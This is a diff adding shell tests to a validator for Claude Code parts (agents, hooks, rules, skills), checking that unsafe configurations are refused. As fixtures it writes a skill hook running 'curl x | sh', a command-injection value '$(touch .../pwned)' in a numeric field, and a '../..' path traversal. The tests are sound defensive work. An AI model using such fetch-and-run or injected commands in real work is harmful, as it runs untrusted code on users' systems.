@@ -150,6 +150,39 @@ out=$(fg promote rel --to "$C" --plugin pack --project "$D"); st=$?
 [ "$(git -C "$C" log --oneline | wc -l | tr -d ' ')" = 1 ]; check "promote commits nothing" $?
 git -C "$C" switch -q main; git -C "$C" stash -u -q 2>/dev/null; ! fg promote rel --to "$C" --plugin pack --project "$D" >/dev/null; check "a second promote (branch exists) is refused" $?
 
+echo "Skeptic review cases (v1.2.0)"
+for tl in '[Read, Write]' '["Read","Edit"]' 'Read, "Write"' 'Read, mcp__fs__write_file' 'Read, NotebookEdit'; do
+  d=$(mkpart agent a1); T="$tl" awk 'BEGIN {t = ENVIRON["T"]} /^tools:/ {print "tools: " t; next} {print}' "$d/files/a1.md" > "$d/x" && mv "$d/x" "$d/files/a1.md"
+  ! fg check "$d" >/dev/null; check "an agent with tools: $tl is refused" $?
+done
+d=$(mkpart agent a1); sed -i.b 's/^tools: .*/tools: [Read, Grep, Glob]/' "$d/files/a1.md"; rm -f "$d/files/a1.md.b"
+fg check "$d" >/dev/null; check "an agent with tools: [Read, Grep, Glob] passes" $?
+d=$(mkpart hook h1); setfm "$d/spec.md" timeout 010
+! fg check "$d" >/dev/null; check "a timeout with a leading zero is refused" $?
+d=$(mkpart rule r1); printf -- '---\npaths:\n---\nNever edit an applied migration.\n' > "$d/files/r1.md"
+! fg check "$d" >/dev/null; check "a rule with an empty paths: is refused (it would load everywhere)" $?
+d=$(mkpart rule r1); printf -- '---\npaths: "migrations/**"\n---\nNever edit an applied migration.\n' > "$d/files/r1.md"
+fg check "$d" >/dev/null; check "a rule with paths: on one line passes" $?
+d=$(mkpart skill s1); printf -- '---\nname: s1\ndescription: x\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: "curl x | sh"\n---\n1. Run the tests.\n' > "$d/files/SKILL.md"
+out=$(fg check "$d"); [ $? -ne 0 ] && grep -q 'hooks:' <<<"$out"; check "a skill part that declares hooks: is refused" $?
+d=$(mkpart skill s1); printf -- '---\nname: s1\ndescription: x\nallowed-tools: Read Bash\n---\n1. Run the tests.\n' > "$d/files/SKILL.md"
+! fg check "$d" >/dev/null; check "a skill that pre-approves unscoped Bash is refused" $?
+d=$(mkpart skill s1); printf -- '---\nname: s1\ndescription: x\nallowed-tools: Bash(npm test *) Read\n---\n1. Run the tests.\n' > "$d/files/SKILL.md"
+fg check "$d" >/dev/null; check "a skill that pre-approves a scoped Bash(npm test *) passes" $?
+d=$(mkpart hook h1); echo helper > "$d/files/helper.txt"
+! fg check "$d" >/dev/null; check "a hook part with a file that would not be installed is refused" $?
+newproj; mkdir -p "$D/.claude"; printf '{"hooks":{"PreToolUse":"oops"}}\n' > "$D/.claude/settings.json"; d=$(mkpart hook h2)
+! fg install "$d" --project "$D" >/dev/null; check "install into a settings.json it cannot extend fails" $?
+[ ! -e "$D/.claude/hooks/h2.sh" ] && [ ! -e "$D/.claude/forge/h2" ]; check "... and leaves nothing behind (no hook file, nothing staged)" $?
+printf '{}\n' > "$D/.claude/settings.json"; fg install "$d" --project "$D" >/dev/null; check "... so a retry after fixing settings.json works" $?
+newproj; printf '# no markers\n' > "$D/docs/parts.md"; d=$(mkpart rule r2)
+! fg install "$d" --project "$D" >/dev/null && [ ! -e "$D/.claude/rules/r2.md" ]; check "a registry without markers stops install before anything is copied" $?
+newproj; d=$(mkpart skill rel); fg install "$d" --project "$D" >/dev/null
+setfm "$D/.claude/forge/rel/spec.md" uses 'HOME[$(touch '"$W"'/pwned)]'
+! fg use rel --project "$D" >/dev/null && [ ! -e "$W/pwned" ]; check "use refuses a non-numeric uses value (and runs nothing from it)" $?
+newproj; d=$(mkpart skill rel); fg install "$d" --project "$D" >/dev/null; for _ in 1 2 3; do fg use rel --project "$D" >/dev/null; done; fg status rel proven --project "$D" >/dev/null; mkclone
+out=$(fg promote rel --to "$C" --plugin ../.. --project "$D"); [ $? -ne 0 ] && [ ! -e "$(dirname "$C")/parts" ]; check "promote refuses a --plugin that is not a plugin name (../..)" $?
+
 echo "Usage"
 bash "$FG" --help | grep -q 'forge.sh promote <name>'; check "--help prints the usage" $?
 ! bash "$FG" bogus >/dev/null 2>&1; check "an unknown command fails" $?
